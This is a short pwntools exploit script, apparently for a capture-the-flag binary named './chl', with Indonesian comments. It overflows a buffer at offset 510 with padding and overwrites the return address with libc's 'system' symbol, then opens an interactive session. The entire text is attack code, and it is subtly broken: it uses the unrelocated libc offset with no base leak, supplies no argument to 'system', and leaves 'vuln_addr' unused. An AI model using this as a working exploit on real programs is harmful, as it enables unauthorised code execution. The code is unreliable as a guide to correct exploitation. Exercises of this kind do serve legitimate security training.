from pwn import *

p = process('./chl')

# dapatkan alamat fungsi vuln
elf = ELF('./chl')
vuln_addr = elf.symbols['vuln']

# dapatkan alamat sistem
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
system_addr = libc.symbols['system']

# offset buffer overflow
offset = 510

# payload
payload = b'A' * offset
payload += p64(system_addr)

# kirim payload
p.sendline(payload)

# interaksi dengan program yang sudah dieksekusi
p.interactive()
